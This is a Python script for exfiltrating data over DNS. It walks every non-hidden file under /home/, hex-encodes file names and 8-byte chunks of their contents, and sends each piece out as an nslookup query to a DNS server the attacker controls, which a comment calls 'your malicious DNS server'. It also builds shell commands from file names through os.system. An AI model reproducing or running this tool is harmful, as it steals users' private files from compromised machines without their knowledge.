from os import chdir
from os import  walk
from os import getcwd
from os import system
from time import sleep
from binascii import hexlify
from os import path

def dnsRequest(payload):
    print("Before encoding: ")
    print(payload)
    print()
    send = hexlify(payload)
    print("After encod  ing: ")
    print(send)
    DNS = ".xor.com"
    go = send.decode("utf-8") + DNS
    #example:  nslookup x.7612436984938403940392.xor.com x.x.x.x
    nscommand = "nslookup x." + go + " x.x.x.x" #change x.x.x.x with your IP if you are dns query forwarder
    system(nscommand)
    print(nscommand)

    # now i make the request, like:  $ nslookup x.payload.xor.com IPserverDNS
    # 'xor.com' is a generic name, You have to change It with your malicious DNS server name
    #or if you are not an auth DNS, replace IPserverDNS with your VPS IP


chdir("/home/") #you can set every path

for directory, subdirectory, files in walk(getcwd()):
                            print("--We are in the directory: " + str(directory))
                            print("--The subdirectories in this directory are: " +  str(subdirectory))
                            print("--The files in this directory are: "+str(files))
                            print()



                            for file in files:

                                        if(file[0]!="."):
                                            sleep(1)
                                            print("Directory: "+directory+" FILE: "+file)
                                            if not ((path.abspath(directory+"/"+file)).find("/.", 0 , len(path.abspath(directory+"/"+file)))>0): #i do not consider files that are in a directory that start with dot("/.name")

                                                fp=open(directory + "/" + file, "rb")
                                                finish="n"

                                                partNum=0
                                                try:
                                                    file=file.decode("utf-8")
                                                except:
                                                    print("")
                                                if len(file) < 13:
                                                    #file="b'"+file+"'"
                                                    payload = "0|" + hexlify(file).decode("utf-8")
                                                    dnsRequest(payload)  # THIS SEND THE FILE NAME
                                                else:
                                                    file = file[0] + file[1] + file[2] + file[3] + file[4] + file[5] + \
                                                           file[6] + file[7] + file[8] + file[9] + file[10] + file[11] \
                                                           + file[12]
                                                    if file[12]=="x":
                                                        file[12]="a"
                                                    payload = "0|" + hexlify(file)
                                                    dnsRequest(payload)#THIS SEND THE FILE NAME

                                                while finish=="n":
                                                    partNum=partNum+1
                                                    contents=fp.read(8)
                                                    if contents:
                                                        print("That's the contents: "+contents)
                                                        sleep(1)
                                                        print(partNum)
                                                        payload= str(partNum) + "|" + hexlify(contents).decode("utf-8")
                                                        dnsRequest(payload)     #THIS SEND a part of THE FILE CONTENTS

                                                    else:
                                                        finish="y"
                                                        print("Transfert complete")

                                                fp.close()
                                            else:
                                                print("This path is not considered:" + (path.abspath(directory+"/"+file)))
                                        else:
                                           	  print("I will not send a file that start with \" . \"  (dot)")













































